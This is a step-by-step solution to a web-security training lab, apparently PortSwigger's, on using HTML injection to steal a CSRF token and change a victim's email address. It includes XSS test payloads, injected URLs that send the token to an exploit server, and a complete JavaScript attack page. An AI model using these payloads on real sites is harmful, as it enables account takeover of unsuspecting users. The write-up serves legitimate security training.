## Exploiting XSS to bypass CSRF defenses

This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to steal a CSRF token, which you can then use to change the email address of someone who views the blog post comments.

You can log in to your own account using the following credentials: wiener:peter

Hint :

You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, use a different email address for the final exploit you deliver to the victim.

## Notes

- Possibility to leave a comment on a post
- Exploit Server

## Resume

1. Log in to the lab with provided credentials  
2. Interact with the **change email** function  
3. Observe client-side validation blocking standard XSS payloads  
4. Bypass client-side validation  
5. Test reflected inputs via URL parameters  
6. Use the exploit server to capture CSRF token  
7. Inject final payload to change victim email  

## Solve

Log in to the lab using the provided credentials and navigate to the **change email** page.

Submitting a standard XSS payload such as:

```html
<img src onerror=alert(1)>
```

does not execute because client-side validation prevents non-email formats.

Inspect the email input using browser DevTools. Note the following:

- The input type can be changed from `email` to `text` to bypass client-side validation.  
- A hidden input field contains a CSRF token, which is required for the email change process.

To bypass validation, embed the XSS payload within a valid email format:

```text
foo@example.com"><img src= onerror=alert(1)>
```

Submit the form. The payload is reflected on the page but escaped, indicating proper server-side sanitization. The presence of CSP likely blocks script execution.

Test reflected input via URL parameter:

```text
https://YOUR-LAB-ID.web-security-academy.net/my-account?email=<img src onerror=alert(1)>
```

The payload appears in the page source but does not execute. Check the DevTools console for CSP messages confirming the inline script was blocked.

Use the exploit server to bypass CSP:

- Copy the exploit server URL (including `/exploit`):  

```text
https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit
```

- Inject a button via the email query parameter:

```text
https://YOUR-LAB-ID.web-security-academy.net/my-account?email=foo@bar"><button formaction="https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit">Click me</button>
```

Notes:

- Include a valid email format to pass client-side validation  
- Close the email value with a quotation mark to ensure proper HTML structure  
- The button’s `formaction` points to the exploit server  

Load the URL and click the button. You are redirected to the exploit server. The CSRF token is not visible because the form uses `POST`.

Capture the CSRF token by submitting the form using `GET`:

```text
https://YOUR-LAB-ID.web-security-academy.net/my-account?email=foo@bar"><button formaction="https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit" formmethod="get">Click me</button>
```

Click the button to reveal the CSRF token in the URL.

Use the exploit server to inject the final attack:

```html
<body>
<script>
// Define URLs
const academyFrontend = "https://0abb00df033248b08062945700de00ad.web-security-academy.net/";
const exploitServer = "https://exploit-0a3e000503a8482b80ab930601fa00f9.exploit-server.net/exploit";

// Extract CSRF token from URL
const url = new URL(location);
const csrf = url.searchParams.get('csrf');

if (csrf) {
    // Create dynamic form
    const form = document.createElement('form');
    const email = document.createElement('input');
    const token = document.createElement('input');

    token.name = 'csrf';
    token.value = csrf;

    email.name = 'email';
    email.value = 'hacker@evil-user.net';

    form.method = 'post';
    form.action = `${academyFrontend}my-account/change-email`;
    form.append(email);
    form.append(token);
    document.documentElement.append(form);
    form.submit();
} else {
    // Redirect to generate CSRF token via GET
    location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
}
</script>
</body>
```

- Click **Store**, then **Deliver exploit to victim**.  
- The victim’s email is changed to `hacker@evil-user.net`.  
